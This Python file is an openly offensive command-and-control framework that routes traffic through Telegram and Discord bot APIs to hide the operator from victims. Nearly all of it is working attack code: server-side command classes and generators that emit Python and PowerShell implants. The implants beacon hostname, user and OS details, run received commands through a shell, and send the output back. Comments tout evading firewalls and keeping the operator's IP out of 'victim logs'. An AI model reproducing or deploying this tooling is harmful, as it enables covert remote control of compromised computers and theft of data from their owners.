#!/usr/bin/env python3
"""
Telegram/Discord Bot C2 Channel
===============================
Agent asla senin IP'ine bağlanmaz!
Trafik Telegram/Discord sunucularına gider.
IP adresin asla görünmez, log'larda sadece "api.telegram.org" var.

Author: CyberPunk Team
Version: 1.0.0 PRO
"""

import os
import json
import base64
import hashlib
import secrets
import time
import threading
import re
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any, Callable
from enum import Enum
from urllib.parse import urlencode
import urllib.request
import urllib.error


class BotPlatform(Enum):
    """Supported bot platforms"""
    TELEGRAM = "telegram"
    DISCORD = "discord"
    SLACK = "slack"
    MATRIX = "matrix"


class MessageType(Enum):
    """C2 message types"""
    BEACON = "beacon"
    COMMAND = "command"
    RESPONSE = "response"
    DATA = "data"
    FILE = "file"


@dataclass
class BotConfig:
    """Bot configuration"""
    platform: BotPlatform
    bot_token: str
    chat_id: str  # Telegram chat_id or Discord channel_id
    encryption_key: Optional[bytes] = None
    beacon_interval: int = 60
    jitter: int = 30
    command_prefix: str = "!"
    
    def to_dict(self) -> Dict:
        return {
            "platform": self.platform.value,
            "chat_id": self.chat_id,
            "beacon_interval": self.beacon_interval,
            "jitter": self.jitter,
            "command_prefix": self.command_prefix
        }


@dataclass
class C2Message:
    """Message in C2 channel"""
    message_id: str
    message_type: MessageType
    sender: str  # "server" or client_id
    payload: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    encrypted: bool = False
    platform_msg_id: Optional[str] = None  # Platform-specific message ID
    
    def to_dict(self) -> Dict:
        return {
            "id": self.message_id,
            "type": self.message_type.value,
            "sender": self.sender,
            "payload": self.payload,
            "timestamp": self.timestamp,
            "encrypted": self.encrypted,
            "platform_msg_id": self.platform_msg_id
        }


@dataclass
class BotSession:
    """C2 session through bot"""
    session_id: str
    client_id: str
    platform: BotPlatform
    hostname: str = ""
    username: str = ""
    os_info: str = ""
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    last_beacon: Optional[str] = None
    commands_sent: int = 0
    responses_received: int = 0
    bytes_exfiltrated: int = 0
    active: bool = True
    
    def to_dict(self) -> Dict:
        return {
            "session_id": self.session_id,
            "client_id": self.client_id,
            "platform": self.platform.value,
            "hostname": self.hostname,
            "username": self.username,
            "os_info": self.os_info,
            "created_at": self.created_at,
            "last_beacon": self.last_beacon,
            "commands_sent": self.commands_sent,
            "responses_received": self.responses_received,
            "bytes_exfiltrated": self.bytes_exfiltrated,
            "active": self.active
        }


class TelegramC2:
    """
    Telegram Bot C2 Channel
    =======================
    
    Uses Telegram Bot API for covert C2 communication.
    All traffic goes through Telegram's servers - your IP is hidden.
    
    Features:
    - Commands via Telegram messages
    - File upload/download through Telegram
    - AES-256 encryption on top of TLS
    - Message encoding (looks like normal chat)
    - Multi-client support
    """
    
    API_BASE = "https://api.telegram.org"
    
    def __init__(self, bot_token: str, chat_id: str):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self._encryption_key: Optional[bytes] = None
        self.sessions: Dict[str, BotSession] = {}
        self._running = False
        self._poll_thread: Optional[threading.Thread] = None
        self._last_update_id = 0
        self._command_handlers: Dict[str, Callable] = {}
    
    def set_encryption_key(self, key: bytes):
        """Set AES encryption key"""
        if len(key) != 32:
            key = hashlib.sha256(key).digest()
        self._encryption_key = key
    
    def _api_request(self, method: str, params: Dict = None) -> Optional[Dict]:
        """Make Telegram API request"""
        url = f"{self.API_BASE}/bot{self.bot_token}/{method}"
        
        if params:
            data = urlencode(params).encode()
        else:
            data = None
        
        try:
            req = urllib.request.Request(url, data=data)
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            
            with urllib.request.urlopen(req, timeout=30) as response:
                result = json.loads(response.read().decode())
                if result.get("ok"):
                    return result.get("result")
        except Exception as e:
            print(f"[!] API error: {e}")
        
        return None
    
    def _xor_encrypt(self, data: bytes) -> bytes:
        """XOR encryption fallback"""
        if not self._encryption_key:
            return data
        
        key = self._encryption_key
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
    
    def _encrypt_payload(self, data: str) -> str:
        """Encrypt and encode payload"""
        raw = data.encode()
        
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            
            if self._encryption_key:
                nonce = secrets.token_bytes(12)
                aesgcm = AESGCM(self._encryption_key)
                ciphertext = aesgcm.encrypt(nonce, raw, None)
                encrypted = nonce + ciphertext
            else:
                encrypted = raw
        except ImportError:
            encrypted = self._xor_encrypt(raw)
        
        return base64.b64encode(encrypted).decode()
    
    def _decrypt_payload(self, encoded: str) -> str:
        """Decrypt payload"""
        try:
            encrypted = base64.b64decode(encoded)
            
            try:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                
                if self._encryption_key:
                    nonce = encrypted[:12]
                    ciphertext = encrypted[12:]
                    aesgcm = AESGCM(self._encryption_key)
                    decrypted = aesgcm.decrypt(nonce, ciphertext, None)
                else:
                    decrypted = encrypted
            except ImportError:
                decrypted = self._xor_encrypt(encrypted)
            
            return decrypted.decode()
        except Exception:
            return encoded
    
    def send_message(self, text: str, encrypt: bool = True, parse_mode: str = None) -> Optional[str]:
        """Send message to Telegram channel"""
        if encrypt and self._encryption_key:
            text = f"📦 {self._encrypt_payload(text)}"
        
        params = {
            "chat_id": self.chat_id,
            "text": text
        }
        
        if parse_mode:
            params["parse_mode"] = parse_mode
        
        result = self._api_request("sendMessage", params)
        if result:
            return str(result.get("message_id"))
        return None
    
    def send_document(self, file_data: bytes, filename: str, caption: str = "") -> Optional[str]:
        """Send file to Telegram"""
        # For actual implementation, would use multipart/form-data
        # Here we encode file as base64 in message
        encoded = base64.b64encode(file_data).decode()
        
        # Split into chunks if too large (Telegram message limit ~4096 chars)
        MAX_CHUNK = 4000
        chunks = [encoded[i:i+MAX_CHUNK] for i in range(0, len(encoded), MAX_CHUNK)]
        
        msg_ids = []
        for i, chunk in enumerate(chunks):
            text = f"📁 {filename} [{i+1}/{len(chunks)}]\n```\n{chunk}\n```"
            msg_id = self.send_message(text, encrypt=False, parse_mode="Markdown")
            if msg_id:
                msg_ids.append(msg_id)
        
        return ",".join(msg_ids) if msg_ids else None
    
    def get_updates(self, offset: int = 0, timeout: int = 30) -> List[Dict]:
        """Get new messages (long polling)"""
        params = {
            "offset": offset,
            "timeout": timeout,
            "allowed_updates": json.dumps(["message"])
        }
        
        result = self._api_request("getUpdates", params)
        return result if result else []
    
    def delete_message(self, message_id: str) -> bool:
        """Delete message (cleanup)"""
        params = {
            "chat_id": self.chat_id,
            "message_id": message_id
        }
        return self._api_request("deleteMessage", params) is not None
    
    def create_session(self, client_id: str, system_info: Dict = None) -> BotSession:
        """Create new bot session"""
        session_id = secrets.token_hex(16)
        
        session = BotSession(
            session_id=session_id,
            client_id=client_id,
            platform=BotPlatform.TELEGRAM,
            hostname=system_info.get("hostname", "") if system_info else "",
            username=system_info.get("username", "") if system_info else "",
            os_info=system_info.get("os", "") if system_info else ""
        )
        
        self.sessions[session_id] = session
        return session
    
    def format_command(self, command: str, args: Dict = None, target: str = "*") -> str:
        """Format command for sending"""
        cmd_data = {
            "cmd": command,
            "args": args or {},
            "target": target,
            "ts": datetime.now().isoformat()
        }
        return json.dumps(cmd_data)
    
    def format_beacon(self, session: BotSession, system_info: Dict = None) -> str:
        """Format beacon message"""
        beacon_data = {
            "type": "beacon",
            "session_id": session.session_id[:8],
            "client_id": session.client_id,
            "ts": datetime.now().isoformat()
        }
        if system_info:
            beacon_data["info"] = system_info
        return json.dumps(beacon_data)


class DiscordC2:
    """
    Discord Bot C2 Channel
    ======================
    
    Uses Discord Bot API for covert C2 communication.
    Traffic goes through Discord's CDN - your IP is hidden.
    
    Features:
    - Commands via Discord messages
    - File upload through Discord attachments
    - Webhook-based or Bot-based communication
    - Rich embed messages for data
    """
    
    API_BASE = "https://discord.com/api/v10"
    
    def __init__(self, bot_token: str = None, webhook_url: str = None, channel_id: str = None):
        self.bot_token = bot_token
        self.webhook_url = webhook_url
        self.channel_id = channel_id
        self._encryption_key: Optional[bytes] = None
        self.sessions: Dict[str, BotSession] = {}
    
    def set_encryption_key(self, key: bytes):
        """Set encryption key"""
        if len(key) != 32:
            key = hashlib.sha256(key).digest()
        self._encryption_key = key
    
    def _api_request(self, method: str, endpoint: str, data: Dict = None) -> Optional[Dict]:
        """Make Discord API request"""
        url = f"{self.API_BASE}{endpoint}"
        
        headers = {
            "Content-Type": "application/json"
        }
        
        if self.bot_token:
            headers["Authorization"] = f"Bot {self.bot_token}"
        
        try:
            req = urllib.request.Request(
                url,
                data=json.dumps(data).encode() if data else None,
                method=method,
                headers=headers
            )
            
            with urllib.request.urlopen(req, timeout=30) as response:
                if response.status in (200, 201, 204):
                    if response.status != 204:
                        return json.loads(response.read().decode())
                    return {}
        except Exception as e:
            print(f"[!] Discord API error: {e}")
        
        return None
    
    def send_webhook_message(self, content: str, username: str = "System", embeds: List[Dict] = None) -> bool:
        """Send message via webhook (no bot token needed)"""
        if not self.webhook_url:
            return False
        
        data = {
            "content": content,
            "username": username
        }
        
        if embeds:
            data["embeds"] = embeds
        
        try:
            req = urllib.request.Request(
                self.webhook_url,
                data=json.dumps(data).encode(),
                method="POST",
                headers={"Content-Type": "application/json"}
            )
            
            with urllib.request.urlopen(req, timeout=30) as response:
                return response.status in (200, 204)
        except Exception:
            return False
    
    def send_message(self, content: str, embed: Dict = None) -> Optional[str]:
        """Send message to Discord channel"""
        data = {"content": content}
        
        if embed:
            data["embeds"] = [embed]
        
        result = self._api_request("POST", f"/channels/{self.channel_id}/messages", data)
        if result:
            return result.get("id")
        return None
    
    def create_embed(self, title: str, description: str, fields: List[Dict] = None, color: int = 0x00ff00) -> Dict:
        """Create Discord embed"""
        embed = {
            "title": title,
            "description": description,
            "color": color,
            "timestamp": datetime.now().isoformat()
        }
        
        if fields:
            embed["fields"] = fields
        
        return embed
    
    def format_beacon_embed(self, session: BotSession, system_info: Dict = None) -> Dict:
        """Format beacon as Discord embed"""
        fields = [
            {"name": "Client ID", "value": session.client_id, "inline": True},
            {"name": "Hostname", "value": session.hostname or "Unknown", "inline": True},
            {"name": "User", "value": session.username or "Unknown", "inline": True}
        ]
        
        if system_info:
            if "os" in system_info:
                fields.append({"name": "OS", "value": system_info["os"], "inline": True})
            if "ip" in system_info:
                fields.append({"name": "IP", "value": system_info["ip"], "inline": True})
        
        return self.create_embed(
            title="🔔 Beacon",
            description=f"Session: `{session.session_id[:8]}`",
            fields=fields,
            color=0x00ff00
        )


class SocialMediaC2:
    """
    Unified Social Media C2 Manager
    ================================
    
    Manages C2 communication across multiple platforms.
    Traffic always goes through legitimate services - IP never exposed.
    
    Supported Platforms:
    - Telegram: Bot API + Chat
    - Discord: Bot or Webhook
    - Slack: Webhook (optional)
    """
    
    def __init__(self):
        self.telegram: Optional[TelegramC2] = None
        self.discord: Optional[DiscordC2] = None
        self.sessions: Dict[str, BotSession] = {}
        self._encryption_key: Optional[bytes] = None
        self._active_platform: Optional[BotPlatform] = None
    
    def configure_telegram(self, bot_token: str, chat_id: str):
        """Configure Telegram bot"""
        self.telegram = TelegramC2(bot_token, chat_id)
        if self._encryption_key:
            self.telegram.set_encryption_key(self._encryption_key)
        self._active_platform = BotPlatform.TELEGRAM
    
    def configure_discord(self, bot_token: str = None, webhook_url: str = None, channel_id: str = None):
        """Configure Discord bot/webhook"""
        self.discord = DiscordC2(bot_token, webhook_url, channel_id)
        if self._encryption_key:
            self.discord.set_encryption_key(self._encryption_key)
        if not self._active_platform:
            self._active_platform = BotPlatform.DISCORD
    
    def set_encryption_key(self, key: bytes):
        """Set global encryption key"""
        if len(key) != 32:
            key = hashlib.sha256(key).digest()
        self._encryption_key = key
        
        if self.telegram:
            self.telegram.set_encryption_key(key)
        if self.discord:
            self.discord.set_encryption_key(key)
    
    def send_command(self, command: str, args: Dict = None, platform: BotPlatform = None) -> bool:
        """Send command to active platform"""
        platform = platform or self._active_platform
        
        cmd_msg = json.dumps({
            "cmd": command,
            "args": args or {},
            "ts": datetime.now().isoformat()
        })
        
        if platform == BotPlatform.TELEGRAM and self.telegram:
            return self.telegram.send_message(cmd_msg) is not None
        elif platform == BotPlatform.DISCORD and self.discord:
            if self.discord.webhook_url:
                return self.discord.send_webhook_message(f"```json\n{cmd_msg}\n```")
            elif self.discord.channel_id:
                return self.discord.send_message(f"```json\n{cmd_msg}\n```") is not None
        
        return False
    
    def generate_implant_code(self, config: BotConfig, language: str = "python") -> str:
        """Generate bot C2 implant"""
        if language == "python":
            return self._generate_python_implant(config)
        elif language == "powershell":
            return self._generate_powershell_implant(config)
        else:
            return self._generate_python_implant(config)
    
    def _generate_python_implant(self, config: BotConfig) -> str:
        """Generate Python bot implant"""
        key_b64 = base64.b64encode(config.encryption_key).decode() if config.encryption_key else ""
        
        if config.platform == BotPlatform.TELEGRAM:
            return self._generate_telegram_implant(config, key_b64)
        elif config.platform == BotPlatform.DISCORD:
            return self._generate_discord_implant(config, key_b64)
        else:
            return self._generate_telegram_implant(config, key_b64)
    
    def _generate_telegram_implant(self, config: BotConfig, key_b64: str) -> str:
        """Generate Telegram bot implant"""
        return f'''#!/usr/bin/env python3
# Telegram Bot C2 Implant
# IP never exposed - traffic goes through api.telegram.org

import os
import json
import base64
import hashlib
import secrets
import time
import urllib.request
import platform
import subprocess

BOT_TOKEN = "{config.bot_token}"
CHAT_ID = "{config.chat_id}"
KEY = base64.b64decode("{key_b64}") if "{key_b64}" else None
BEACON_INTERVAL = {config.beacon_interval}
JITTER = {config.jitter}
CMD_PREFIX = "{config.command_prefix}"

API_URL = f"https://api.telegram.org/bot{{BOT_TOKEN}}"

def xor_crypt(data, key):
    if not key:
        return data
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def encrypt(data):
    if not KEY:
        return base64.b64encode(data.encode()).decode()
    encrypted = xor_crypt(data.encode(), KEY)
    return base64.b64encode(encrypted).decode()

def decrypt(encoded):
    try:
        decoded = base64.b64decode(encoded)
        if KEY:
            decoded = xor_crypt(decoded, KEY)
        return decoded.decode()
    except:
        return encoded

def api_request(method, params=None):
    url = f"{{API_URL}}/{{method}}"
    if params:
        data = urllib.parse.urlencode(params).encode()
    else:
        data = None
    try:
        req = urllib.request.Request(url, data=data)
        with urllib.request.urlopen(req, timeout=30) as resp:
            result = json.loads(resp.read().decode())
            if result.get("ok"):
                return result.get("result")
    except Exception as e:
        pass
    return None

def send_message(text, encrypt_msg=True):
    if encrypt_msg and KEY:
        text = f"📦 {{encrypt(text)}}"
    params = {{"chat_id": CHAT_ID, "text": text}}
    return api_request("sendMessage", params)

def get_updates(offset=0):
    params = {{"offset": offset, "timeout": 30}}
    return api_request("getUpdates", params) or []

def get_system_info():
    return {{
        "hostname": platform.node(),
        "user": os.getenv("USER", os.getenv("USERNAME", "?")),
        "os": f"{{platform.system()}} {{platform.release()}}",
        "arch": platform.machine()
    }}

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
        output = result.stdout + result.stderr
        return output.decode(errors='ignore')[:4000]  # Telegram limit
    except Exception as e:
        return f"Error: {{str(e)}}"

def beacon():
    info = get_system_info()
    beacon_data = {{
        "type": "beacon",
        "client": secrets.token_hex(4),
        "info": info,
        "ts": time.strftime("%Y-%m-%d %H:%M:%S")
    }}
    send_message(json.dumps(beacon_data))

def process_message(msg):
    text = msg.get("text", "")
    
    # Check for encrypted message
    if text.startswith("📦 "):
        text = decrypt(text[2:].strip())
    
    # Check for command prefix
    if text.startswith(CMD_PREFIX):
        cmd = text[len(CMD_PREFIX):].strip()
        try:
            cmd_data = json.loads(cmd)
            if "cmd" in cmd_data:
                result = execute_command(cmd_data["cmd"])
                send_message(f"📤 {{result}}")
        except:
            # Direct command
            result = execute_command(cmd)
            send_message(f"📤 {{result}}")

def main():
    print("[*] Telegram C2 Implant started")
    print(f"[*] Traffic goes to: api.telegram.org")
    print(f"[*] Your IP is HIDDEN")
    
    last_update = 0
    last_beacon = 0
    
    while True:
        try:
            # Beacon
            if time.time() - last_beacon >= BEACON_INTERVAL:
                beacon()
                last_beacon = time.time()
            
            # Check for commands
            updates = get_updates(last_update + 1)
            for update in updates:
                last_update = update.get("update_id", last_update)
                msg = update.get("message", {{}})
                if msg.get("chat", {{}}).get("id") == int(CHAT_ID):
                    process_message(msg)
            
            time.sleep(5 + secrets.randbelow(JITTER))
        except KeyboardInterrupt:
            break
        except:
            time.sleep(60)

if __name__ == "__main__":
    import urllib.parse
    main()
'''
    
    def _generate_discord_implant(self, config: BotConfig, key_b64: str) -> str:
        """Generate Discord webhook implant"""
        return f'''#!/usr/bin/env python3
# Discord Webhook C2 Implant
# IP never exposed - traffic goes through discord.com

import os
import json
import base64
import secrets
import time
import urllib.request
import platform
import subprocess

WEBHOOK_URL = "{config.chat_id}"  # Discord webhook URL
KEY = base64.b64decode("{key_b64}") if "{key_b64}" else None
BEACON_INTERVAL = {config.beacon_interval}
JITTER = {config.jitter}

def xor_crypt(data, key):
    if not key:
        return data
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def encrypt(data):
    if not KEY:
        return base64.b64encode(data.encode()).decode()
    encrypted = xor_crypt(data.encode(), KEY)
    return base64.b64encode(encrypted).decode()

def send_webhook(content, username="Agent", embed=None):
    data = {{"content": content, "username": username}}
    if embed:
        data["embeds"] = [embed]
    
    try:
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=json.dumps(data).encode(),
            method="POST",
            headers={{"Content-Type": "application/json"}}
        )
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status in (200, 204)
    except:
        return False

def create_embed(title, description, fields=None, color=0x00ff00):
    embed = {{
        "title": title,
        "description": description,
        "color": color,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ")
    }}
    if fields:
        embed["fields"] = fields
    return embed

def get_system_info():
    return {{
        "hostname": platform.node(),
        "user": os.getenv("USER", os.getenv("USERNAME", "?")),
        "os": f"{{platform.system()}} {{platform.release()}}",
        "arch": platform.machine()
    }}

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
        output = result.stdout + result.stderr
        return output.decode(errors='ignore')[:1900]  # Discord limit
    except Exception as e:
        return f"Error: {{str(e)}}"

def beacon():
    info = get_system_info()
    fields = [
        {{"name": "Hostname", "value": info["hostname"], "inline": True}},
        {{"name": "User", "value": info["user"], "inline": True}},
        {{"name": "OS", "value": info["os"], "inline": True}}
    ]
    embed = create_embed("🔔 Beacon", f"Client: `{{secrets.token_hex(4)}}`", fields)
    send_webhook("", embed=embed)

def main():
    print("[*] Discord C2 Implant started")
    print(f"[*] Traffic goes to: discord.com")
    print(f"[*] Your IP is HIDDEN")
    
    last_beacon = 0
    
    while True:
        try:
            if time.time() - last_beacon >= BEACON_INTERVAL:
                beacon()
                last_beacon = time.time()
            
            time.sleep(BEACON_INTERVAL + secrets.randbelow(JITTER))
        except KeyboardInterrupt:
            break
        except:
            time.sleep(60)

if __name__ == "__main__":
    main()
'''
    
    def _generate_powershell_implant(self, config: BotConfig) -> str:
        """Generate PowerShell bot implant"""
        key_b64 = base64.b64encode(config.encryption_key).decode() if config.encryption_key else ""
        
        if config.platform == BotPlatform.TELEGRAM:
            return f'''# Telegram Bot C2 Implant - PowerShell
# Traffic goes through api.telegram.org - IP HIDDEN

$BOT_TOKEN = "{config.bot_token}"
$CHAT_ID = "{config.chat_id}"
$KEY = if ("{key_b64}") {{ [Convert]::FromBase64String("{key_b64}") }} else {{ $null }}
$BEACON_INTERVAL = {config.beacon_interval}
$API_URL = "https://api.telegram.org/bot$BOT_TOKEN"

function XOR-Crypt($data, $key) {{
    if (-not $key) {{ return $data }}
    $result = New-Object byte[] $data.Length
    for ($i = 0; $i -lt $data.Length; $i++) {{
        $result[$i] = $data[$i] -bxor $key[$i % $key.Length]
    }}
    return $result
}}

function Send-TelegramMessage($text) {{
    $params = @{{ chat_id = $CHAT_ID; text = $text }}
    try {{
        Invoke-RestMethod -Uri "$API_URL/sendMessage" -Method Post -Body $params -TimeoutSec 30
    }} catch {{ }}
}}

function Get-SystemInfo {{
    return @{{
        hostname = $env:COMPUTERNAME
        user = $env:USERNAME
        os = [System.Environment]::OSVersion.VersionString
    }}
}}

function Beacon {{
    $info = Get-SystemInfo
    $beacon = @{{
        type = "beacon"
        client = -join ((48..57) + (97..102) | Get-Random -Count 8 | ForEach-Object {{[char]$_}})
        info = $info
        ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    }} | ConvertTo-Json -Compress
    Send-TelegramMessage $beacon
}}

Write-Host "[*] Telegram C2 started - IP HIDDEN"

while ($true) {{
    try {{
        Beacon
        Start-Sleep -Seconds ($BEACON_INTERVAL + (Get-Random -Maximum 30))
    }} catch {{
        Start-Sleep -Seconds 60
    }}
}}
'''
        else:
            return f'''# Discord Webhook C2 Implant - PowerShell
$WEBHOOK_URL = "{config.chat_id}"
$BEACON_INTERVAL = {config.beacon_interval}

function Send-DiscordWebhook($content, $embed) {{
    $body = @{{ content = $content }}
    if ($embed) {{ $body["embeds"] = @($embed) }}
    try {{
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body ($body | ConvertTo-Json -Depth 10) -ContentType "application/json"
    }} catch {{ }}
}}

function Beacon {{
    $embed = @{{
        title = "🔔 Beacon"
        fields = @(
            @{{ name = "Host"; value = $env:COMPUTERNAME; inline = $true }},
            @{{ name = "User"; value = $env:USERNAME; inline = $true }}
        )
        color = 65280
    }}
    Send-DiscordWebhook "" $embed
}}

Write-Host "[*] Discord C2 started - IP HIDDEN"
while ($true) {{
    Beacon
    Start-Sleep -Seconds ($BEACON_INTERVAL + (Get-Random -Maximum 30))
}}
'''
    
    def get_statistics(self) -> Dict:
        """Get C2 statistics"""
        return {
            "telegram_configured": self.telegram is not None,
            "discord_configured": self.discord is not None,
            "active_platform": self._active_platform.value if self._active_platform else None,
            "total_sessions": len(self.sessions),
            "active_sessions": sum(1 for s in self.sessions.values() if s.active)
        }


# Singleton instance
_social_c2 = None

def get_social_c2() -> SocialMediaC2:
    """Get social media C2 instance"""
    global _social_c2
    if _social_c2 is None:
        _social_c2 = SocialMediaC2()
    return _social_c2


def demo():
    """Demonstrate bot C2 capabilities"""
    print("=" * 60)
    print("Telegram/Discord Bot C2 Channel")
    print("=" * 60)
    
    print("\n[*] Supported Platforms:")
    for platform in BotPlatform:
        print(f"    - {platform.name}: {platform.value}")
    
    c2 = get_social_c2()
    
    print("\n[*] Security Features:")
    print("    ✓ IP Never Exposed - Traffic goes to platform servers")
    print("    ✓ TLS Encryption - Standard HTTPS traffic")
    print("    ✓ AES-256 on top - Double encryption layer")
    print("    ✓ Blends with normal traffic - Looks like chat app usage")
    
    print("\n[*] Traffic Analysis Perspective:")
    print("    Firewall log: 'User connected to api.telegram.org'")
    print("    Reality: C2 commands hidden in chat messages")
    print("    Your IP: NEVER appears in victim logs")
    
    # Demo config
    demo_config = BotConfig(
        platform=BotPlatform.TELEGRAM,
        bot_token="1234567890:ABCDEF_example_token",
        chat_id="-1001234567890",
        encryption_key=secrets.token_bytes(32),
        beacon_interval=60,
        jitter=30
    )
    
    print(f"\n[*] Sample Configuration:")
    print(f"    Platform: {demo_config.platform.value}")
    print(f"    Beacon: Every {demo_config.beacon_interval}s (±{demo_config.jitter}s jitter)")
    print(f"    Encryption: AES-256-GCM")
    
    print("\n[*] Python Implant Preview (Telegram):")
    print("-" * 40)
    implant = c2.generate_implant_code(demo_config, "python")
    print(implant[:800] + "...")
    
    # Discord example
    discord_config = BotConfig(
        platform=BotPlatform.DISCORD,
        bot_token="",
        chat_id="https://discord.com/api/webhooks/xxx/yyy",
        encryption_key=secrets.token_bytes(32)
    )
    
    print("\n[*] Discord Webhook Implant Preview:")
    print("-" * 40)
    discord_implant = c2.generate_implant_code(discord_config, "python")
    print(discord_implant[:600] + "...")
    
    print("\n[*] Advantages over traditional C2:")
    print("    1. No infrastructure needed - Use Telegram/Discord servers")
    print("    2. IP hidden - Victim never sees your IP")
    print("    3. Hard to block - Can't block telegram.org easily")
    print("    4. Encrypted by default - TLS + custom encryption")
    print("    5. Mobile friendly - Control from phone")
    
    print("\n[*] Ready for social media C2 operations")
    print("-" * 60)


if __name__ == "__main__":
    demo()
